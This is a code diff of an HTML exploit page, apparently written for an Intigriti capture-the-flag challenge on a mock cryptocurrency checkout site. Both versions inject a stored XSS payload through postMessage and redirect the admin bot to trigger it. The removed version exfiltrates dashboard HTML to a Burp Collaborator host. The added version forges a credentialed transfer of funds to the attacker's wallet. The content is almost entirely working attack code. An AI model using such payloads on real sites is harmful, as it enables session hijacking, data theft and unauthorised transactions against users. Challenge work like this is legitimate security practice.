@@ -2,60 +2,71 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Intigriti Challenge</title>
+    <title>Intigriti Challenge - Money Transfer</title>
 </head>
 <body>
-    <h1>Exploit Sent to Bot...</h1>
+    <h1>Processing Transaction...</h1>
     
     <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:0;height:0;border:0;"></iframe>
 
     <script>
-        // CONFIGURATION
+        // --- CONFIGURATION ---
         const BASE_URL = 'https://challenge-0126.intigriti.io';
-        // Your Burp Collaborator
-        const LISTENER = 'http://3hlm5jcmzv03ev6im3t9niq43v9mxfl4.oastify.com';
+        
+        // ⚠️ PASTE YOUR 1337COIN ADDRESS HERE ⚠️
+        const MY_WALLET = '13303a656bdddcb618e9c24da160327453'; 
 
         const frame = document.getElementById('target');
         
         frame.onload = function() {
-            // Prevent infinite loop when we redirect the iframe later
+            // Prevent loop
             if (this.src.includes('marketwatch')) return;
 
             setTimeout(() => {
                 
-                // --- THE FIXED PAYLOAD ---
-                // 1. Fetch dashboard.html
-                // 2. Use .text() to get the raw HTML source
-                // 3. We use btoa() to Base64 encode it so the HTML tags don't break your URL
+                // --- THE PAYLOAD ---
+                // This script runs inside the Admin's browser on marketwatch.html.
+                // It silently calls the API to send YOU money.
                 
-                const fetchCode = `
-                    fetch('/dashboard.html', {credentials: 'include'})
-                    .then(r => r.text())
-                    .then(html => {
-                        // Send the full HTML source (which contains the hidden flag)
-                        location = '${LISTENER}/?data=' + btoa(html.substring(0, 2000));
+                const jsCode = `
+                    fetch('/api/transaction', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        credentials: 'include',
+                        body: JSON.stringify({
+                            toAddress: '${MY_WALLET}',
+                            currency: '1337COIN',
+                            amount: 1000 
+                        })
                     })
+                    .then(r => r.json())
+                    .then(data => console.log('Money Sent!', data));
                 `;
 
-                // Flatten code for injection
-                const safeCode = fetchCode.replace(/\n/g, ' ');
-                // Break out of title attribute
-                const xss = `"><img src=x onerror="${safeCode}">`;
+                // Flatten the code so it fits in the HTML attribute
+                const flatCode = jsCode.replace(/\n/g, ' ');
 
-                // 3. Send the Message
+                // The Injection: Break out of title attribute, inject img with onerror trigger
+                const xss = `"><img src=x onerror="${flatCode}">`;
+
+                // 3. Send the Initial Malicious Transaction (The Carrier)
+                // This puts our XSS payload into the MarketWatch database
                 frame.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        currency: '1337COIN', // Valid currency for Admin
+                        currency: '1337COIN', 
                         amount: 1337, 
                         toAddress: xss
                     }
                 }, '*');
 
-                // 4. Redirect to MarketWatch to trigger the trap
+                // 4. Redirect the Admin to MarketWatch
+                // When this page loads, the XSS above executes, and the money transfer happens.
                 setTimeout(() => {
                     frame.src = BASE_URL + '/marketwatch.html';
-                }, 1500);
+                }, 2000);
 
             }, 2000);
         };
